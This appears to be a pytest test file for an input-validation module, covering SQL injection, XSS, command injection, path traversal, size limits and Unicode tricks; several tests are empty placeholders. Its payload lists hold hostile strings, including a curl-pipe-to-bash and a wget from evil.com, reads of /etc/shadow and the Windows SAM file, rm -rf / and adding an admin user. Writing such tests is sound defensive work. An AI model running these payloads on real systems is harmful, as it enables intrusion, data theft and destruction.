"""
Comprehensive input validation and sanitization tests.

Tests cover:
- SQL injection prevention
- XSS prevention
- Command injection prevention
- Path traversal prevention
- Input size limits
- Data type validation
"""
import pytest
from unittest.mock import Mock, patch
import json
import os

from src.utils.validators import (
    validate_and_sanitize_input,
    validate_email,
    validate_username,
    validate_file_path,
    validate_json_input,
    validate_model_name,
    InputValidationError,
    COMMON_SQL_INJECTION_PATTERNS,
    COMMON_XSS_PATTERNS
)


class TestSQLInjectionPrevention:
    """Test SQL injection prevention."""
    
    def test_basic_sql_injection_patterns(self):
        """Test detection of basic SQL injection attempts."""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM passwords --",
            "admin'--",
            "' OR 1=1--",
            "1'; DELETE FROM users WHERE '1'='1",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin') --"
        ]
        
        for payload in sql_payloads:
            with pytest.raises(InputValidationError) as exc:
                validate_and_sanitize_input(payload, "text")
            assert "sql injection" in str(exc.value).lower()
    
    def test_encoded_sql_injection(self):
        """Test detection of encoded SQL injection."""
        encoded_payloads = [
            "%27%20OR%20%271%27%3D%271",  # URL encoded
            "&#39; OR &#39;1&#39;=&#39;1",  # HTML encoded
            "\\' OR \\'1\\'=\\'1",  # Escaped quotes
            "CHAR(39)+OR+CHAR(39)+CHAR(49)+CHAR(39)+CHAR(61)+CHAR(39)+CHAR(49)",
        ]
        
        for payload in encoded_payloads:
            result = validate_and_sanitize_input(payload, "text")
            # Should either reject or safely encode
            assert not any(pattern in result.upper() for pattern in ["OR", "UNION", "SELECT"])
    
    def test_sql_keywords_in_legitimate_text(self):
        """Test that legitimate text with SQL keywords is allowed."""
        legitimate_texts = [
            "I would like to select the best option",
            "Drop me an email when you're done",
            "The union of these sets is important",
            "Update me on the progress",
            "Delete the unnecessary files from my computer"
        ]
        
        for text in legitimate_texts:
            # Should not raise exception for legitimate use
            result = validate_and_sanitize_input(text, "text")
            assert result == text
    
    def test_nested_sql_injection(self):
        """Test detection of nested/obfuscated SQL injection."""
        nested_payloads = [
            "'; /*comment*/ DROP /*comment*/ TABLE users; --",
            "' UNUNIONION SESELECTLECT * FROM users --",  # Doubled keywords
            "' OR/*comment*/1=1--",
            "'; DECLARE @x VARCHAR(100); SET @x='DROP TABLE users'; EXEC(@x); --"
        ]
        
        for payload in nested_payloads:
            with pytest.raises(InputValidationError):
                validate_and_sanitize_input(payload, "text", strict=True)


class TestXSSPrevention:
    """Test XSS (Cross-Site Scripting) prevention."""
    
    def test_basic_xss_patterns(self):
        """Test detection of basic XSS attempts."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<a href='javascript:void(0)' onclick='alert(\"XSS\")'>Click</a>",
            "<input type='text' value='x' onmouseover='alert(\"XSS\")'>",
            "<div style='background:url(javascript:alert(\"XSS\"))'>",
            "';alert(String.fromCharCode(88,83,83))//",
        ]
        
        for payload in xss_payloads:
            result = validate_and_sanitize_input(payload, "html")
            # Should strip dangerous tags/attributes
            assert "<script" not in result.lower()
            assert "javascript:" not in result.lower()
            assert "onerror" not in result.lower()
            assert "onload" not in result.lower()
    
    def test_encoded_xss(self):
        """Test detection of encoded XSS attempts."""
        encoded_xss = [
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
        ]
        
        for payload in encoded_xss:
            result = validate_and_sanitize_input(payload, "text")
            # After decoding, should not contain script tags
            assert "<script" not in result.lower()
    
    def test_event_handler_xss(self):
        """Test removal of event handlers."""
        event_handlers = [
            "<div onclick='alert(1)'>Click me</div>",
            "<img src='valid.jpg' onmouseover='alert(1)'>",
            "<input onfocus='alert(1)' type='text'>",
            "<form onsubmit='alert(1)'></form>",
            "<body onunload='alert(1)'>",
        ]
        
        for payload in event_handlers:
            result = validate_and_sanitize_input(payload, "html")
            # Event handlers should be removed
            assert " on" not in result.lower()
    
    def test_css_xss(self):
        """Test XSS in CSS contexts."""
        css_xss = [
            "background: url('javascript:alert(1)')",
            "behavior: url('xss.htc')",
            "expression(alert('XSS'))",
            "-moz-binding: url('xss.xml#xss')",
        ]
        
        for payload in css_xss:
            result = validate_and_sanitize_input(payload, "css")
            assert "javascript:" not in result.lower()
            assert "expression" not in result.lower()
            assert "behavior:" not in result.lower()
    
    def test_legitimate_html_preserved(self):
        """Test that legitimate HTML is preserved."""
        legitimate_html = [
            "<p>This is a paragraph</p>",
            "<strong>Bold text</strong>",
            "<a href='https://example.com'>Link</a>",
            "<img src='image.jpg' alt='Description'>",
            "<div class='container'>Content</div>",
        ]
        
        for html in legitimate_html:
            result = validate_and_sanitize_input(html, "html", allow_html=True)
            # Basic tags should be preserved
            assert "<p>" in result or "<strong>" in result or "<a" in result or "<img" in result or "<div" in result


class TestCommandInjectionPrevention:
    """Test command injection prevention."""
    
    def test_shell_command_injection(self):
        """Test detection of shell command injection."""
        command_payloads = [
            "; cat /etc/passwd",
            "| ls -la",
            "` whoami `",
            "$( cat /etc/shadow )",
            "&& rm -rf /",
            "|| wget http://evil.com/backdoor.sh",
            "; python -c 'import os; os.system(\"whoami\")'",
            "\n/bin/sh",
            "$(curl http://evil.com/script.sh | bash)",
        ]
        
        for payload in command_payloads:
            with pytest.raises(InputValidationError) as exc:
                validate_and_sanitize_input(payload, "text", context="filename")
            assert "invalid" in str(exc.value).lower()
    
    def test_windows_command_injection(self):
        """Test Windows-specific command injection."""
        windows_payloads = [
            "& dir C:\\",
            "| type C:\\Windows\\System32\\config\\SAM",
            "&& net user hacker Password123! /add",
            "& powershell.exe -Command \"Get-Process\"",
            "%0a ping -n 10 127.0.0.1",
        ]
        
        for payload in windows_payloads:
            with pytest.raises(InputValidationError):
                validate_and_sanitize_input(payload, "text", context="filename")


class TestPathTraversalPrevention:
    """Test path traversal prevention."""
    
    def test_basic_path_traversal(self):
        """Test detection of basic path traversal attempts."""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/var/www/../../etc/passwd",
            "C:\\inetpub\\wwwroot\\..\\..\\..\\windows\\system32\\",
        ]
        
        for payload in traversal_payloads:
            with pytest.raises(InputValidationError) as exc:
                validate_file_path(payload)
            assert "traversal" in str(exc.value).lower() or "invalid" in str(exc.value).lower()
    
    def test_encoded_path_traversal(self):
        """Test encoded path traversal attempts."""
        encoded_traversals = [
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "%252e%252e%252f",
            "\\x2e\\x2e\\x2f",
        ]
        
        for payload in encoded_traversals:
            with pytest.raises(InputValidationError):
                validate_file_path(payload)
    
    def test_null_byte_injection(self):
        """Test null byte injection in file paths."""
        null_byte_payloads = [
            "file.txt%00.jpg",
            "file.txt\x00.jpg",
            "../../etc/passwd%00",
            "valid_file.pdf\x00.txt",
        ]
        
        for payload in null_byte_payloads:
            with pytest.raises(InputValidationError):
                validate_file_path(payload)
    
    def test_legitimate_paths(self):
        """Test that legitimate paths are allowed."""
        legitimate_paths = [
            "documents/report.pdf",
            "images/photo.jpg",
            "data/dataset.csv",
            "user_uploads/file_123.txt",
            "project/src/main.py",
        ]
        
        for path in legitimate_paths:
            result = validate_file_path(path, base_path="/app/storage")
            assert result is not None


class TestInputSizeLimits:
    """Test input size validation."""
    
    def test_string_length_limits(self):
        """Test string length validation."""
        # Test max length enforcement
        long_string = "A" * 10001  # Exceeds typical max length
        
        with pytest.raises(InputValidationError) as exc:
            validate_and_sanitize_input(long_string, "text", max_length=10000)
        assert "too long" in str(exc.value).lower() or "length" in str(exc.value).lower()
    
    def test_array_size_limits(self):
        """Test array size limits."""
        large_array = list(range(1001))  # Exceeds typical array limit
        
        with pytest.raises(InputValidationError):
            validate_and_sanitize_input(large_array, "array", max_items=1000)
    
    def test_json_depth_limits(self):
        """Test JSON nesting depth limits."""
        # Create deeply nested JSON
        deep_json = {}
        current = deep_json
        for i in range(100):
            current["nested"] = {}
            current = current["nested"]
        
        with pytest.raises(InputValidationError) as exc:
            validate_json_input(json.dumps(deep_json), max_depth=50)
        assert "depth" in str(exc.value).lower() or "nested" in str(exc.value).lower()
    
    def test_file_size_validation(self):
        """Test file upload size validation."""
        # This would test actual file upload size limits
        # Placeholder for file upload validation
        pass


class TestDataTypeValidation:
    """Test data type validation."""
    
    def test_email_validation(self):
        """Test email address validation."""
        valid_emails = [
            "user@example.com",
            "test.user+tag@example.co.uk",
            "user123@test-domain.com",
            "firstname.lastname@company.org",
        ]
        
        invalid_emails = [
            "not-an-email",
            "@example.com",
            "user@",
            "user @example.com",
            "user@.com",
            "user@domain",
            "user.example.com",
            "",
            None,
        ]
        
        for email in valid_emails:
            assert validate_email(email) is True
        
        for email in invalid_emails:
            assert validate_email(email) is False
    
    def test_username_validation(self):
        """Test username validation."""
        valid_usernames = [
            "john_doe",
            "user123",
            "test-user",
            "User_Name",
        ]
        
        invalid_usernames = [
            "user name",  # Space
            "user@domain",  # Special char
            "ab",  # Too short
            "a" * 51,  # Too long
            "../admin",  # Path traversal
            "admin--",  # SQL comment
            "<script>",  # XSS
            "",
            None,
        ]
        
        for username in valid_usernames:
            assert validate_username(username) is True
        
        for username in invalid_usernames:
            assert validate_username(username) is False
    
    def test_model_name_validation(self):
        """Test model name validation."""
        valid_model_names = [
            "gpt-3.5-turbo",
            "mistral-7b-instruct",
            "llama2-70b",
            "claude-2.1",
        ]
        
        invalid_model_names = [
            "../models/evil",  # Path traversal
            "model; DROP TABLE",  # SQL injection
            "<script>alert()</script>",  # XSS
            "model\x00.bin",  # Null byte
            "",
        ]
        
        for name in valid_model_names:
            assert validate_model_name(name) is True
        
        for name in invalid_model_names:
            assert validate_model_name(name) is False
    
    def test_numeric_validation(self):
        """Test numeric input validation."""
        # Test integer validation
        assert validate_and_sanitize_input("123", "integer") == 123
        assert validate_and_sanitize_input("-456", "integer") == -456
        
        with pytest.raises(InputValidationError):
            validate_and_sanitize_input("123.45", "integer")
        
        with pytest.raises(InputValidationError):
            validate_and_sanitize_input("not-a-number", "integer")
        
        # Test float validation
        assert validate_and_sanitize_input("123.45", "float") == 123.45
        assert validate_and_sanitize_input("-0.001", "float") == -0.001
        
        # Test range validation
        assert validate_and_sanitize_input("50", "integer", min_value=0, max_value=100) == 50
        
        with pytest.raises(InputValidationError):
            validate_and_sanitize_input("150", "integer", min_value=0, max_value=100)


class TestContextualValidation:
    """Test context-aware validation."""
    
    def test_graphql_query_validation(self):
        """Test GraphQL query validation."""
        valid_queries = [
            "{ user { id name } }",
            "query GetUser($id: ID!) { user(id: $id) { name email } }",
            "mutation UpdateUser($id: ID!, $name: String!) { updateUser(id: $id, name: $name) { id } }",
        ]
        
        malicious_queries = [
            "{ user { id name } }; DROP TABLE users; --",
            "{ __schema { types { name } } }",  # Introspection (might be disabled in prod)
            "query { ' OR '1'='1 }",
        ]
        
        # Test that valid queries pass
        for query in valid_queries:
            # Would use actual GraphQL validation
            pass
        
        # Test that malicious queries are caught
        for query in malicious_queries:
            # Would validate against schema and security rules
            pass
    
    def test_json_schema_validation(self):
        """Test JSON schema validation."""
        schema = {
            "type": "object",
            "properties": {
                "name": {"type": "string", "maxLength": 100},
                "age": {"type": "integer", "minimum": 0, "maximum": 150},
                "email": {"type": "string", "format": "email"}
            },
            "required": ["name", "email"]
        }
        
        valid_data = {
            "name": "John Doe",
            "age": 30,
            "email": "john@example.com"
        }
        
        invalid_data = [
            {"name": "John", "age": "thirty"},  # Wrong type
            {"name": "A" * 101, "email": "test@example.com"},  # Too long
            {"email": "test@example.com"},  # Missing required field
            {"name": "John", "age": -1, "email": "test@example.com"},  # Out of range
        ]
        
        # Would use jsonschema validation
        pass


class TestEncodingAndCharacterValidation:
    """Test character encoding and Unicode validation."""
    
    def test_unicode_normalization(self):
        """Test Unicode normalization to prevent homograph attacks."""
        homograph_attempts = [
            "ɑdmin",  # Latin small letter alpha instead of 'a'
            "аdmin",  # Cyrillic 'а' instead of Latin 'a'
            "‚admin",  # Different quote character
        ]
        
        for attempt in homograph_attempts:
            normalized = validate_and_sanitize_input(attempt, "username")
            # Should either reject or normalize to ASCII
            assert normalized != attempt or "admin" not in normalized
    
    def test_control_character_stripping(self):
        """Test removal of control characters."""
        inputs_with_control = [
            "Hello\x00World",  # Null byte
            "Test\x08String",  # Backspace
            "Line1\x1bLine2",  # Escape
            "Text\x7fMore",    # Delete
        ]
        
        for input_str in inputs_with_control:
            result = validate_and_sanitize_input(input_str, "text")
            # Control characters should be removed
            assert all(ord(c) >= 32 or c in '\t\n\r' for c in result)
    
    def test_bidi_character_handling(self):
        """Test handling of bidirectional text characters."""
        # These can be used to obscure malicious code
        bidi_text = "Hello \u202E dlroW"  # Right-to-left override
        
        result = validate_and_sanitize_input(bidi_text, "text")
        # Bidi control characters should be handled safely
        assert "\u202E" not in result or len(result) != len(bidi_text)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])